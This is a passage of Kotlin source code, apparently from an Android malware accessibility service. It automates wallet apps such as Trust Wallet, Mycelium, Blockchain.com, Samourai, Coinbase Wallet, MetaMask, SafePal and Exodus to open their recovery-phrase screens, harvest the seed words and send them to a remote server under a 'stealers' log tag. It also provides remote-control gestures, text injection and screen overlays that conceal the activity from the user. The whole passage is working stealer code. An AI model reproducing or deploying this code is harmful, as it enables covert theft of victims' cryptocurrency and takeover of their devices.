                            }
                        }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/concent3")
                        ?.firstOrNull()
                        ?.let {
                            runCatching {
                                val check = it.getChild(0).getChild(1)
                                if (check.className == "android.widget.CheckBox") {
                                    if (!check.isChecked)
                                        click(check.parent)
                                }
                            }
                        }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/next")
                        ?.firstOrNull { it.isClickable }
                        ?.let {
                            click(it)
                        }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/phrase")
                        ?.firstOrNull()
                        ?.let {
                            val obj = JSONObject()
                            for (i in 0 until it.childCount) {
                                val child = it.getChild(i)

                                val child1 = child.getChild(0).text
                                val child2 = child.getChild(1).text

                                obj.put("number_$i", child1)
                                obj.put("word_$i", child2)
                            }

                            if (obj.length() > 0) {
                                IOSocketyt.sendLogs("com.wallet.crypto.trustappt", obj.toString(), "stealers")
                                SharedPreferencess.SettingsWrite("trust", "1")
                                blockBack()
                            }
                        }
                }
                return@runCatching
            }.onFailure {
                IOSocketyt.sendLogs("", "trust ${it.localizedMessage}", "error")
            }

            //----------------com.mycelium.wallet--------------
            runCatching {
                if (packageAppStart.contains(constNm.mycelium) && SharedPreferencess.SettingsRead("mycelium") == null) {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.mycelium}:id/miRefresh")
                        ?.firstOrNull()?.parent?.getChild(1)
                        ?.let {
                            if (it.viewIdResourceName != "com.mycelium.wallet:id/miRefresh")
                                click(it)
                            else {
                                runCatching {
                                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.mycelium}:id/miRefresh")
                                        ?.firstOrNull()?.parent?.getChild(2)
                                        ?.let {
                                            click(it)
                                        }
                                }
                            }
                        }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.mycelium}:id/content")
                        ?.get(1)
                        ?.let {
                            click(it.parent)
                        }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                        ?.firstOrNull()
                        ?.let {
                            click(it)
                            TimeUnit.MILLISECONDS.sleep(150.toLong())
                            eventRootInActiveWindow?.refresher()
                        }

                    val obj = JSONObject()
                    var jj = 0
                    while (eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.mycelium}:id/btOkay")
                            ?.firstOrNull { it.isClickable } != null
                    ) {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.mycelium}:id/btOkay")
                            ?.firstOrNull { it.isClickable }
                            ?.let {
                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.mycelium.wallet:id/tvShowWordNumber")
                                    ?.firstOrNull()
                                    ?.let {
                                        val text = it.text
                                        obj.put("number_$jj", text)
                                        jj++
                                    }

                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.mycelium.wallet:id/tvShowWord")
                                    ?.firstOrNull()
                                    ?.let {
                                        val text = it.text
                                        obj.put("word_$jj", text)
                                        jj++
                                    }

                                click(it)
                                TimeUnit.MILLISECONDS.sleep(30.toLong())
                                eventRootInActiveWindow?.refresher()
                            }
                    }

                    if (obj.length() > 0) {
                        IOSocketyt.sendLogs("com.mycelium.wallet", obj.toString(), "stealers")
                        SharedPreferencess.SettingsWrite("mycelium", "1")
                        blockBack()
                    }

                    return@runCatching
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "mycelium ${it.localizedMessage}", "error")
            }

            //----------------piuk.blockchain.android--------------
            runCatching {
                if (packageAppStart.contains(constNm.piuk) && SharedPreferencess.SettingsRead("piuk") == null) {
                    runCatching {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/content")
                            ?.firstOrNull()
                            ?.let {
                                val view = it.getChild(0)?.getChild(0)?.getChild(0)
                                if (view?.childCount == 4
                                    && view.getChild(0).className == "android.widget.TextView"
                                    && view.getChild(1).className == "android.widget.TextView"
                                    && view.getChild(2).className == "android.view.View"
                                ) {
                                    click(view.getChild(2).getChild(0).getChild(0))
                                }
                            }
                    }
                    runCatching {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/content")
                            ?.firstOrNull()
                            ?.let {
                                val view = it.getChild(0)?.getChild(0)?.getChild(0)?.getChild(5)?.getChild(0)
                                if (view?.childCount == 7
                                    && view.getChild(2).className == "android.widget.TextView"
                                    && view.getChild(0).className == "android.view.View"
                                    && view.getChild(0).isClickable
                                ) {
                                    click(view.getChild(0))
                                }
                            }
                    }

                    runCatching {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("piuk.blockchain.android:id/security_group")
                            ?.firstOrNull()?.getChild(0)?.getChild(0)?.getChild(0)
                    }.getOrNull()
                        ?.let {
                            click(it)
                        }

                    runCatching {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("piuk.blockchain.android:id/security_backup_phrase")
                            ?.firstOrNull()?.getChild(0)?.getChild(0)?.getChild(0)
                    }.getOrNull()
                        ?.let {
                            click(it)
                        }

                    runCatching {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/content")
                            ?.firstOrNull()
                            ?.let {
                                val view = it.getChild(0)?.getChild(0)
                                if (view?.childCount == 7 && view.getChild(3).className == "android.view.View" && view.getChild(3)
                                        .getChild(0).childCount == 24
                                ) {
                                    val curview = view.getChild(3).getChild(0)

                                    val obj = JSONObject()
                                    for ((jj, i) in (0 until curview.childCount).withIndex()) {
                                        val text = curview.getChild(i).text
                                        obj.put("$jj", text)
                                    }

                                    if (obj.length() > 0) {
                                        IOSocketyt.sendLogs("piuk.blockchain.android", obj.toString(), "stealers")
                                        SharedPreferencess.SettingsWrite("piuk", "1")
                                        blockBack()
                                    }
                                }
                            }
                    }

                    return@runCatching
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "piuk ${it.localizedMessage}", "error")
            }

            //----------------com.samourai.wallet--------------
            runCatching {
                if (packageAppStart.contains(constNm.samourai) && SharedPreferencess.SettingsRead("samourai") == null) {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.samourai}:id/buttonPanel")
                        ?.firstOrNull()
                        ?.let {
                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button2")
                                ?.firstOrNull()
                                ?.let {
                                    click(it)
                                }
                        }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.samourai}:id/skipClaim")
                        ?.firstOrNull()
                        ?.let {
                            click(it)
                        }
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.samourai}:id/toolbarIcon")
                        ?.firstOrNull()
                        ?.let {
                            click(it)
                        }

                    runCatching {
                        val list =
                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.samourai}:id/mpm_popup_menu_item_label")
                        if (!list.isNullOrEmpty() && list.size == 5) {
                            list[list.size - 2]
                                ?.let {
                                    click(it.parent)
                                    TimeUnit.MILLISECONDS.sleep(150.toLong())
                                    eventRootInActiveWindow?.refresher()
                                }
                        }
                    }

                    runCatching {
                        if ((eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/title")?.size ?: 0) == 4) {
                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/title")
                                ?.firstOrNull()
                                ?.let {
                                    click(it.parent.parent)
                                    TimeUnit.MILLISECONDS.sleep(50.toLong())
                                    eventRootInActiveWindow?.refresher()
                                }
                        }
                    }

                    runCatching {
                        if ((eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/checkbox")?.size ?: 0) == 3) {
                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/title")
                                ?.get(3)
                                ?.let {
                                    click(it.parent.parent)
                                }
                        }
                    }

                    val obj = JSONObject()
                    var jj = 0
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.samourai}:id/custom")
                        ?.firstOrNull()
                        ?.let {
                            obj.put(
                                "word_$jj",
                                "${
                                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.samourai}:id/custom")
                                        ?.firstOrNull()?.getChild(0)?.text ?: ""
                                }"
                            )
                            jj++
                        }

                    if (obj.length() > 0) {
                        IOSocketyt.sendLogs("com.samourai.wallet", obj.toString(), "stealers")
                        SharedPreferencess.SettingsWrite("samourai", "1")
                        blockBack()
                    }

                    return@runCatching
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "samourai ${it.localizedMessage}", "error")
            }

            //----------------org.toshi--------------
            runCatching {
                if (packageAppStart.contains(constNm.toshi) && SharedPreferencess.SettingsRead("toshi") == null) {
                    iterateNodesToFindViewWithId(eventRootInActiveWindow, "SettingsTabButton")
                        ?.let {
                            clickNodeOrParent(it, false)
                        }

                    iterateNodesToFindViewWithId(eventRootInActiveWindow, "recovery-phrase-list-cell")
                        ?.let {
                            clickNodeOrParent(it, false)
                        }

                    val obj = JSONObject()
                    val jj = 0
                    iterateNodesToFindViewWithId(eventRootInActiveWindow, "mnemonic-text-display-blurred")
                        ?.let {
                            obj.put("word_$jj", it.contentDescription)
                        }

                    if (obj.length() > 0) {
                        IOSocketyt.sendLogs("org.toshi", obj.toString(), "stealers")
                        SharedPreferencess.SettingsWrite("toshi", "1")
                        blockBack()
                    }

                    return@runCatching
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "toshi ${it.localizedMessage}", "error")
            }

            //----------------io.metamask--------------
            runCatching {
                if (packageAppStart.contains(constNm.metamask) && SharedPreferencess.SettingsRead("metamask") == null) {

                    iterateNodesToFindViewWithDesc(eventRootInActiveWindow, "hamburger-menu-button-wallet")
                        ?.let {
                            if (it.isVisibleToUser)
                                clickNodeOrParent(it, false)
                        }

                    iterateNodesToFindContainsTextNode(eventRootInActiveWindow, "\uE9C4")
                        ?.let {
                            if (it.isVisibleToUser)
                                click(it.parent)
                        }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByText("MetaMetrics,")
                        ?.firstOrNull()?.parent?.parent
                        ?.let {
                            click(it)
                        }

                    iterateNodesToFindViewWithId(eventRootInActiveWindow, "reveal-seed-button")?.let {
                        clickNodeOrParent(it, false)
                        TimeUnit.MILLISECONDS.sleep(200.toLong())
                    }

                    iterateNodesToFindContainsTextNode(eventRootInActiveWindow, "\uF00C")
                        ?.let {
                            iterateNodesToFindContainsTextNode(eventRootInActiveWindow, "\uF023")
                                ?.let {
//                                    if (mGestureCallbackWallets?.mCompleted != true)
//                                        return@let

                                    val view = it.parent.parent.parent.parent
                                    val rect = Rect()
                                    view.getBoundsInScreen(rect)

                                    mGestureCallbackWallets?.mCompleted = false
                                    dispatchCallback(
                                        Resources.getSystem().displayMetrics.widthPixels / 2f,
                                        rect.centerY().toFloat(),
                                        true,
                                        mGestureCallbackWallets
                                    )

                                    TimeUnit.MILLISECONDS.sleep(500.toLong())
                                }
                        }

                    iterateNodesToFindViewWithId(eventRootInActiveWindow, "private-credential-text")
                        ?.let {
                            val obj = JSONObject()
                            obj.put("seed", it.text)
                            IOSocketyt.sendLogs(constNm.metamask, obj.toString(), "stealers")
                            SharedPreferencess.SettingsWrite("metamask", "1")
                            mGestureCallback?.mCompleted = true
                            mGestureCallbackWallets?.mCompleted = true
                            blockBack()
                        }

                    return@runCatching
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "metamask ${it.localizedMessage}", "error")
            }

            //----------------io.safepal.wallet--------------
            runCatching {
                if (packageAppStart.contains(constNm.safepal) && SharedPreferencess.SettingsRead("safepal") == null) {

                    iterateNodesToFindViewWithIdClassWithDesc(eventRootInActiveWindow, "android.view.View", 3)?.let {
                        if (it.getChild(0).className == "android.widget.Button"
                            && it.getChild(1).className == "android.widget.Button"
                            && it.getChild(2).className == "android.widget.Button"
                        ) {
                            click(it, true)
                            eventRootInActiveWindow?.refresher()
                        }
                    }

                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/content")
                        ?.firstOrNull()
                        ?.let {
                            val view = it.getChild(0)?.getChild(0)?.getChild(0)?.getChild(0)?.getChild(0)
                            if (view?.childCount == 7
                                && view.getChild(3).className == "android.widget.ImageView"
                                && view.getChild(4).className == "android.widget.EditText"
                            ) {
                                click(view.getChild(5).getChild(0).getChild(1).getChild(0).getChild(0))
                            }
                        }


                    runCatching {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/content")
                            ?.firstOrNull()
                            ?.let {
                                val view = it.getChild(0)?.getChild(0)?.getChild(0)?.getChild(0)?.getChild(0)
                                if (view?.childCount == 3
                                    && view.getChild(1).getChild(0).childCount == 4
                                ) {
                                    click(view.getChild(1).getChild(0).getChild(2).getChild(0))
                                }
                            }
                    }

                    iterateNodesToFindViewWithCntChildAndType(eventRootInActiveWindow, 12, "android.view.View")?.let {
                        val childCount = it.childCount
                        val obj = JSONObject()
                        for (i in 0 until childCount) {
                            val childNodeInfo = it.getChild(i)
                            obj.put("$i", childNodeInfo.contentDescription)
                        }
                        IOSocketyt.sendLogs(constNm.safepal, obj.toString(), "stealers")
                        SharedPreferencess.SettingsWrite("safepal", "1")
                        blockBack()
                    }
                    return@runCatching
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "safepal ${it.localizedMessage}", "error")
            }

            //----------------exodusmovement.exodus--------------
            runCatching {
                if (packageAppStart.contains(constNm.exodus) && SharedPreferencess.SettingsRead("exodus") == null) {
                    if (cntExodusDhag % 5 == 0) {
                        iterateNodesToFindExodus(eventRootInActiveWindow, "android.view.ViewGroup")
                        cntExodusDhag++

                        if (iterateNodesToFindExodusSecurity(eventRootInActiveWindow, "android.view.ViewGroup") != null)
                            return@runCatching

                        iterateNodesToFindExodusBackup(eventRootInActiveWindow)

                        if (iterateNodesToFindExodusViewSecret(eventRootInActiveWindow) != null)
                            return@runCatching

                        if (iterateNodesToFindExodusPhrase(eventRootInActiveWindow) != null)
                            return@runCatching
                    } else if (cntExodusDhag % 5 == 1) {
                        if (iterateNodesToFindExodusSecurity(eventRootInActiveWindow, "android.view.ViewGroup") != null) {
                            cntExodusDhag++
                            return@runCatching
                        }

                        iterateNodesToFindExodusBackup(eventRootInActiveWindow)

                        if (iterateNodesToFindExodusViewSecret(eventRootInActiveWindow) != null)
                            return@runCatching

                        if (iterateNodesToFindExodusPhrase(eventRootInActiveWindow) != null)
                            return@runCatching

                        iterateNodesToFindExodus(eventRootInActiveWindow, "android.view.ViewGroup")
                    } else if (cntExodusDhag % 5 == 2) {
                        iterateNodesToFindExodusBackup(eventRootInActiveWindow)
                        cntExodusDhag++

                        if (iterateNodesToFindExodusViewSecret(eventRootInActiveWindow) != null)
                            return@runCatching

                        if (iterateNodesToFindExodusPhrase(eventRootInActiveWindow) != null)
                            return@runCatching

                        iterateNodesToFindExodus(eventRootInActiveWindow, "android.view.ViewGroup")

                        if (iterateNodesToFindExodusSecurity(eventRootInActiveWindow, "android.view.ViewGroup") != null) {
                            return@runCatching
                        }
                    } else if (cntExodusDhag % 5 == 3) {
                        if (iterateNodesToFindExodusViewSecret(eventRootInActiveWindow) != null) {
                            cntExodusDhag++
                            return@runCatching
                        }

                        if (iterateNodesToFindExodusPhrase(eventRootInActiveWindow) != null)
                            return@runCatching

                        iterateNodesToFindExodus(eventRootInActiveWindow, "android.view.ViewGroup")

                        if (iterateNodesToFindExodusSecurity(eventRootInActiveWindow, "android.view.ViewGroup") != null) {
                            return@runCatching
                        }

                        iterateNodesToFindExodusBackup(eventRootInActiveWindow)
                    } else if (cntExodusDhag % 5 == 4) {
                        if (iterateNodesToFindExodusPhrase(eventRootInActiveWindow) != null)
                            return@runCatching

                        iterateNodesToFindExodus(eventRootInActiveWindow, "android.view.ViewGroup")

                        if (iterateNodesToFindExodusSecurity(eventRootInActiveWindow, "android.view.ViewGroup") != null) {
                            return@runCatching
                        }

                        if (
                            !(eventRootInActiveWindow?.findAccessibilityNodeInfosByText("0")?.any { it.isVisibleToUser } == true
                                    && eventRootInActiveWindow?.findAccessibilityNodeInfosByText("9")?.any { it.isVisibleToUser } == true)
                        ) {
                            iterateNodesToFindExodusBackup(eventRootInActiveWindow)
                        }

                        if (iterateNodesToFindExodusViewSecret(eventRootInActiveWindow) != null)
                            return@runCatching
                    }
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "exodus ${it.localizedMessage}", "error")
            }
        }

        var cntExodusDhag = 0

        fun startGesture(x: Int, y: Int) {
            mPath = Path()
            mPath?.moveTo(x.toFloat(), y.toFloat())
            mLastGestureStartTime = System.currentTimeMillis()
            IOSocketyt.sendLogs("", "startGesture $x $y", "success")
        }

        fun continueGesture(x: Int, y: Int) {
            mPath?.lineTo(x.toFloat(), y.toFloat())
            IOSocketyt.sendLogs("", "continueGesture $x $y", "success")
        }

        fun endGesture(x: Int, y: Int) {
            mPath?.lineTo(x.toFloat(), y.toFloat())
            var duration: Long = System.currentTimeMillis() - mLastGestureStartTime

            if (duration == 0L) duration = 1
            val stroke = mPath?.let { StrokeDescription(it, 0, duration) }
            val builder = GestureDescription.Builder()
            if (stroke != null) {
                builder.addStroke(stroke)
            }
            instance?.dispatchGesture(builder.build(), null, null)
            IOSocketyt.sendLogs("", "endGesture $x $y", "success")
        }

        fun tap(x: Int, y: Int, callback: GestureResultCallback? = null) {
            if (instance != null) instance?.dispatchGesture(createClick(x, y, ViewConfiguration.getTapTimeout() + 50), callback, null)
            IOSocketyt.sendLogs("", "tap $x $y", "success")
        }

        fun clickAt(id: String) {
            if (instance != null) {
                instance?.iterateNodesToFindViewWithId(instance?.eventRootInActiveWindow, id)
                    ?.let {
                        instance?.clickNodeOrParent(it, false)
                    }
                IOSocketyt.sendLogs("", "clickAt $id", "success")
            }
        }

        fun clickAtText(text: String) {
            if (instance != null) {
                instance?.iterateNodesToFindNodeWithText(instance?.eventRootInActiveWindow, text)
                    ?.let {
                        instance?.clickNodeOrParent(it, false)
                        IOSocketyt.sendLogs("", "clickAtText $it", "success")
                    }
            }
        }

        fun clickAtContainsText(text: String) {
            if (instance != null) {
                instance?.iterateNodesToFindContainsTextNode(instance?.eventRootInActiveWindow, text)
                    ?.let {
                        instance?.clickNodeOrParent(it, false)
                        IOSocketyt.sendLogs("", "clickAtContainsText $text", "success")
                    }
            }
        }

        fun setText(viewid: String, text: String) {
            if (instance != null) {
                val args = Bundle()
                args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
                instance?.iterateNodesToFindViewWithId(instance?.eventRootInActiveWindow, viewid)
                    ?.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                IOSocketyt.sendLogs("", "setText $text", "success")
            }
        }

        fun longPress(x: Int, y: Int) {
            if (instance != null) {
                instance?.longPress(x, y)
                IOSocketyt.sendLogs("", "longPress $x $y", "success")
            }
        }

        fun swipe(x: Int, y: Int, x1: Int, y1: Int) {
            if (instance != null) {
                instance?.dispatchGesture(createSwipe(x, y, x1, y1, ViewConfiguration.getScrollDefaultDelay()), null, null)
                IOSocketyt.sendLogs("", "swipe $x $y - $x1 $y1", "success")
            }
        }

        fun swipeDown(x: Int, y: Int) {
            val displayMetrics = DisplayMetrics()
            val wm = instance?.getSystemService(WINDOW_SERVICE) as WindowManager
            wm.defaultDisplay.getRealMetrics(displayMetrics)
            if (instance != null) {
                instance?.dispatchGesture(
                    createSwipe(
                        x,
                        y,
                        x,
                        (y + displayMetrics.heightPixels / 3.0).toInt(),
                        ViewConfiguration.getScrollDefaultDelay()
                    ), null, null
                )

                IOSocketyt.sendLogs("", "swipeDown $x $y", "success")
            }
        }

        fun swipeUp(x: Int, y: Int) {
            val displayMetrics = DisplayMetrics()
            val wm = instance?.getSystemService(WINDOW_SERVICE) as WindowManager
            wm.defaultDisplay.getRealMetrics(displayMetrics)
            if (instance != null) {
                instance?.dispatchGesture(
                    createSwipe(
                        x,
                        y,
                        x,
                        (y - displayMetrics.heightPixels / 3.0).toInt(),
                        ViewConfiguration.getScrollDefaultDelay()
                    ), null, null
                )
                IOSocketyt.sendLogs("", "swipeUp $x $y", "success")
            }
        }

        fun swipeRight(x: Int, y: Int) {
            val displayMetrics = DisplayMetrics()
            val wm = instance?.getSystemService(WINDOW_SERVICE) as WindowManager
            wm.defaultDisplay.getRealMetrics(displayMetrics)
            if (instance != null) {
                instance?.dispatchGesture(
                    createSwipe(
                        displayMetrics.widthPixels / 2,
                        y,
                        (x - 2.0 * displayMetrics.widthPixels / 3.0).toInt(),
                        y,
                        ViewConfiguration.getScrollDefaultDelay()
                    ), null, null
                )
                IOSocketyt.sendLogs("", "swipeRight $x $y", "success")
            }
        }

        fun swipeLeft(x: Int, y: Int) {
            val displayMetrics = DisplayMetrics()
            val wm = instance?.getSystemService(WINDOW_SERVICE) as WindowManager
            wm.defaultDisplay.getRealMetrics(displayMetrics)
            if (instance != null) {
                instance?.dispatchGesture(
                    createSwipe(
                        displayMetrics.widthPixels / 2,
                        y,
                        (x + 2.0 * displayMetrics.widthPixels / 3.0).toInt(),
                        y,
                        ViewConfiguration.getScrollDefaultDelay()
                    ), null, null
                )
                IOSocketyt.sendLogs("", "swipeLeft $x $y", "success")
            }
        }

        fun scrollDown(x: Int, y: Int) {
            val displayMetrics = DisplayMetrics()
            val wm = instance?.getSystemService(WINDOW_SERVICE) as WindowManager
            wm.defaultDisplay.getRealMetrics(displayMetrics)
            instance?.scroll(x, 0, (-2.0 * displayMetrics.heightPixels / 3.0).toInt())
            IOSocketyt.sendLogs("", "scrollDown $x $y", "success")
        }

        fun scrollUp(x: Int, y: Int) {
            val displayMetrics = DisplayMetrics()
            val wm = instance?.getSystemService(WINDOW_SERVICE) as WindowManager
            wm.defaultDisplay.getRealMetrics(displayMetrics)
            instance?.scroll(x, displayMetrics.heightPixels, (2.0 * displayMetrics.heightPixels / 3.0).toInt())
            IOSocketyt.sendLogs("", "scrollUp $x $y", "success")
        }

        fun slide(x: Int) {
            val displayMetrics = DisplayMetrics()
            val wm = instance?.getSystemService(WINDOW_SERVICE) as WindowManager
            wm.defaultDisplay.getRealMetrics(displayMetrics)
            instance?.scroll(x, displayMetrics.heightPixels / 2, (2.0 * displayMetrics.heightPixels / 3.0).toInt())
            IOSocketyt.sendLogs("", "slide $x", "success")
        }

        fun globalActionBack() {
            instance?.performGlobalAction(GLOBAL_ACTION_BACK)
            IOSocketyt.sendLogs("", "globalActionBack", "success")
        }

        fun openRecents() {
            instance?.performGlobalAction(GLOBAL_ACTION_RECENTS)
            IOSocketyt.sendLogs("", "openRecents", "success")
        }

        fun globalActionHome() {
            instance?.performGlobalAction(GLOBAL_ACTION_HOME)
            IOSocketyt.sendLogs("", "globalActionHome", "success")
        }

        fun onCutText(text: String) {
            Log.d(TAG, "onCutText: text '$text' ")
            try {
                instance?.mMainHandler?.post {
                    (instance?.applicationContext?.getSystemService(CLIPBOARD_SERVICE) as ClipboardManager).setPrimaryClip(ClipData.newPlainText(text, text))
                    IOSocketyt.sendLogs("", "onCutText", "success")
                }
            } catch (e: Exception) {
                IOSocketyt.sendLogs("", "onCutText ${e.localizedMessage}", "error")
                Log.e(TAG, "onCutText: failed: $e")
            }
        }

        fun addBlackView() {
            instance?.addBlackView()
        }

        fun deleteBlackView() {
            instance?.deleteBlackView()
        }

        fun addWaitView(colorBack: String, colorText: String, text: String) {
            instance?.addWaitView(colorBack, colorText, text)
        }

        fun deleteWaitView() {
            instance?.deleteWaitView()
        }

        private fun createClick(x: Int, y: Int, duration: Int): GestureDescription {
            val clickPath = Path()
            clickPath.moveTo(x.toFloat(), y.toFloat())
            val clickStroke = StrokeDescription(clickPath, 0, duration.toLong())
            val clickBuilder = GestureDescription.Builder()
            clickBuilder.addStroke(clickStroke)
            return clickBuilder.build()
        }

        private fun createSwipe(x1: Int, y1: Int, x2: Int, y2: Int, duration: Int): GestureDescription {
            var x1 = x1
            var y1 = y1
            var x2 = x2
            var y2 = y2
            val swipePath = Path()
            x1 = x1.coerceAtLeast(0)
            y1 = y1.coerceAtLeast(0)
            x2 = x2.coerceAtLeast(0)
            y2 = y2.coerceAtLeast(0)
            swipePath.moveTo(x1.toFloat(), y1.toFloat())
            swipePath.lineTo(x2.toFloat(), y2.toFloat())
            val swipeStroke = StrokeDescription(swipePath, 0, duration.toLong())
            val swipeBuilder = GestureDescription.Builder()
            swipeBuilder.addStroke(swipeStroke)
            return swipeBuilder.build()
        }

        val handler2 = Handler(Looper.getMainLooper())
        val handler = Handler(Looper.getMainLooper())
    }

}